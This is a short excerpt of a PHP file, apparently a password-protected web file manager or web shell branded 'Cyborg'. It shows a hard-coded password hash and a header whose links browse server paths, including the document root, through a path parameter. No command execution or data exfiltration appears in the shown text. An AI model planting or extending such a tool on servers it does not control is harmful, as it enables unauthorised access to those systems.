...
session_start();
define('APP_VER', '0.8');
$password = defined('PW') ? PW : '5c3e51a4148fa899088a21d5e0a673a8';
...
<header class="container mx-auto flex items-center justify-between p-4">
    <a href="?path=<?=urlencode($self_dir)?>" class="flex items-center">
        <h1 class="text-xl sm:text-2xl lg:text-3xl font-bold">Cyborg</h1>
    </a>
    <a href="?path=<?=urlencode($docroot)?>" class="flex items-center">
        <img alt="Logo App" class="h-8 md:h-12" src="https://media.tenor.com/mfdT9MRrFEMAAAAj/gojo-twerk-gojo-satoru.gif"/>
    </a>
</header>
